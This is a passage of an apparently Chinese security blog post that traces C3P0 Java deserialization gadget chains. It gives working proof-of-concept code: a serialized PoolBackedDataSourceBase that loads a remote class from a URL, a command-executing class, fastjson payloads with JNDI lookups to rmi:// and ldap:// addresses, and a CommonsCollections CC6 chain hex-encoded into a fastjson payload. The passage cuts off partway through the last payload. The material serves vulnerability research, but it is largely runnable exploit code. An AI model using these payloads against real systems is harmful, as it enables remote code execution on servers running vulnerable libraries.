class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c3p0Vul</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXP_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;http://127.0.0.1:8889/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//反射修改connectionPoolDataSource属性值为我们的恶意ConnectionPoolDataSource类</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化流写入文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">EXP_Loader</span> <span class="variable">exp_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EXP_Loader</span>();</span><br><span class="line">        Pool_Serial(exp_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>恶意类一定注意不要有包名不然会报错。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面记录一下这个链的调用过程。</p><h3 id="执行流程详解">执行流程详解</h3><p>首先我们先找到漏洞的触发点是在com/mchange/v2/naming/ReferenceableUtils.java这个类的referentoobject方法里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739252255-65084146-295d-419d-8a75-1887fcf2b96f.png" alt=""></p><p>很明显，该方法是用来进行类加载的。如果设置了一个远程工厂类地址<code>fClassLocation</code>，则会使用URLClassLoader进行远程类加载。</p><p>然后看一下谁调用了他</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739365446-70ca4d16-5018-4556-b08e-bbf66452042b.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739324139-afb7ca42-2180-43a2-b10e-11c929942eb6.png" alt=""></p><p>可以找到是ReferenceableUtils这个类的getObject方法调用了他，再继续找一下是谁调用了他</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739476878-ec11bb2c-2656-45ef-9529-58e5c924f7f2.png" alt=""></p><p>可以看到是PoolBackedDataSourceBase的readObject方法中会进行调用，所以这里调用链就出来了。</p><p>不过这里我们还要详细看一下他的readobject方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739576691-a4c2214b-4466-44a0-82d9-ba2a9ed6b966.png" alt=""></p><p>可以看到在调用他之后会强制转换为ConnectionPoolDataSource类型跟进去看看这个类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739622429-1d6375a3-1f4a-42b2-a34e-df613f4f9795.png" alt=""></p><p>我们发现他并没有实现序列化，所以他是没法被进行序列化的那么这里为什么能转成这个对象呢</p><p>我们到他的writeObejct中看一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739776286-6d3851cb-3053-48f6-a526-265c5f1bec82.png" alt=""></p><p>可以看到这里如果不能进行序列化这个类的话会走到catch方法里用<code>ReferenceIndirector.indirectForm(connectionPoolDataSource)</code>对其进行包装最终会返回一个<code>ReferenceSerialized</code>类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733739914284-7c89ef0e-6185-4e19-b222-b5a5bb54fb52.png" alt=""></p><p>所以<code>ConnectionPoolDataSource</code>类经过序列化后，得到的最终是<code>ReferenceSerialized</code>类，因此在<code>PoolBackedDataSourceBase#readObject</code>中调用的其实是<code>ReferenceSerialized#getObject()</code>方法。</p><p>这里一定要自己跟一下他序列化的流程否则后面的poc看起来可能会有点疑问。可以看到他调用了indirectForm对connectionPoolDataSource进行封装，然后调用了getReference方法将获取引用并实例化进去，这里就是我们的可控点，也就是我们传入恶意地址的地方。这条链其实算是借鸡生蛋，就是借着<code>ConnectionPoolDataSource</code>类来下的<code>ReferenceSerialized</code>🥚。</p><p>所以到这大盖就能明白poc的写法了</p><p>记录下调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase#readObject -&gt;</span><br><span class="line">ReferenceSerialized#getObject -&gt;</span><br><span class="line">ReferenceableUtils#referenceToObject -&gt;</span><br><span class="line">ObjectFactory#getObjectInstance</span><br><span class="line">URLclassLoader 类加载</span><br></pre></td></tr></table></figure><h2 id="jndi利用">jndi利用</h2><p>这里需要依赖于 fastjson 和 jackson去利用。先给出poc</p><h3 id="poc-2">poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,\&quot;jndiName\&quot;: \&quot;rmi://127.0.0.1:1099/e6pbsf\&quot;,\&quot;loginTimeout\&quot;:0&#125;&quot;</span>;        </span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试流程">调试流程</h3><p>先看调用的触发点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746176829-859f9f53-6eed-48a5-8c0c-0321238816c3.png" alt=""></p><p>在com/mchange/v2/c3p0/JndiRefForwardingDataSource.java这个类的dereference方法里存在jndi注入的漏洞。接下来寻找在哪调用了dereference这个方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746266097-036727d5-c545-455b-989b-2adeab7570d7.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746291825-b27c8c84-a0a4-4987-b88e-de3892bb1df2.png" alt=""></p><p>可以看到还是该类的inner方法，继续看在哪调用了该inner方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733746347612-80d0badd-c1c7-4fa6-b7a0-98a234e472a1.png" alt=""></p><p>有好多个这里可以利用的是setLoginTimeout方法。他接受一个int类型的传参数。</p><p>所以这里就可以结合fastjson触发了。找一下jndiName赋值也有<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733749699231-57699f34-8167-4127-a3c2-b4c5f6950239.png" alt=""></p><p>在其父类里面JndiRefDataSourceBase</p><p>其实这里还有一个触发链条就是在这个类JndiRefConnectionPoolDataSource中<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748183528-c51e0183-82d1-496f-aed0-b7ba299c1c69.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748201395-6b31303f-9a2c-449d-af4a-712dc5615ee5.png" alt=""></p><p>同时我们在这个类中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748244314-03111f56-2ca4-4387-ab9e-7faa11148160.png" alt=""></p><p>他是调用了com/mchange/v2/c3p0/WrapperConnectionPoolDataSource.java这个类中的setLoginTimeout方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748266853-84887910-587e-42e2-9199-be81311862ae.png" alt=""></p><p>看看这个getNesteDataSource方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733748309464-474dc855-e8bb-4baa-8d7b-d631ac850fa1.png" alt=""></p><p>直接返回了nestedDataSource对象其实调试会发现这个值最终是com/mchange/v2/c3p0/JndiRefForwardingDataSource.java这个类的对象</p><p>所以就可以通过fastjson结合com/mchange/v2/c3p0/JndiRefConnectionPoolDataSource.java这个类进行构造了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://10.6.42.156:8085/NpgoGBfd\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C3P0-之-HEX流加载任意类攻击">C3P0 之 HEX流加载任意类攻击</h2><p>漏洞主要发生在WrapperConnectionPoolDataSource这个类中，来看一下这个类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755319222-fef10b27-245e-4d75-bc01-fb643f2c3c3d.png" alt=""></p><p>看到他的构造方法调用了parseUserOverridesAsString方法传入的是userOverridesAsString这个属性</p><p>�<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755392004-f2e17934-c4e6-4a48-b556-7503045af6d0.png" alt=""></p><p>接着来看看这个方法干了啥可以看到首先进行字符截取将最后一位和<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755424923-caa297d3-19a0-4fba-898a-4aa0d8e2c09b.png" alt=""></p><p>解析过程中调用了substring()方法将字符串头部的<code>HASM_HEADER</code>截去了，因此我们在构造时需要在十六进制字符串头部加上<code>HASM_HEADER</code>，并且会截去字符串最后一位，所以需要在结尾加上一个<code>;</code></p><p>然后将解码的数据传入到SerializableUtils.fromByteArray方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755545849-e6e31c9e-2baa-4a24-828e-13b6600657b0.png" alt=""></p><p>继续调用，继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755563662-2da85cd2-4d93-41d3-8ad3-854765887ebd.png" alt=""></p><p>可以看到存在readObject反序列化。</p><p>然后我们能联想到fastjson会在反序列化的时候自动调用setter方法所以去找一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733755761615-f897c144-2963-46c9-a953-83a3e318dfeb.png" alt=""></p><p>在其父类WrapperConnectionPoolDataSourceBase里找到了setter方法可控所以就可以来结合fastjson来构造了</p><h3 id="poc-3">poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Hex</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CC6的利用链</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//使用InvokeTransformer包装一下</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;eee&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="comment">//反射修改LazyMap类的factory属性</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将类序列化为字节数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//字节数组转十六进制</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC6()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span 